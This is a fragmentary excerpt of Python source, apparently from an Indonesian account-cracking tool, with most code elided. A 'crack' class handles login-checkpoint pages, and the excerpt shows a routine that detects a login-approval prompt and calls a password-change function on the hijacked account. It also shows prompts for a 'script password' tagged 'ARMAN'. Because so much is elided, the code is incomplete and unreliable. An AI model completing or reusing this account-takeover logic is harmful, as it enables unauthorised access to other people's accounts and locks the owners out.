        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    ...
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "ARMAN  Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
...
class __crack__:
    ...
    def tampilkan_apk(self):
        ...
        crot = input(f" {N}[{K}👌{N}] sebelum lanjut ARMAN  pasword script untuk ke 2 kali nya: {H}")
...
# METODE SANDI MANUAL
    def plerr(self,id):
        ...
        ___yayanganteng___ = input('%s══════════════════════════════════════════\n [%s?%s] ARMAN  pasword script unutuk ke 2 kali nya (%senter%s) : %s'%(M,M,M,M,M,M))
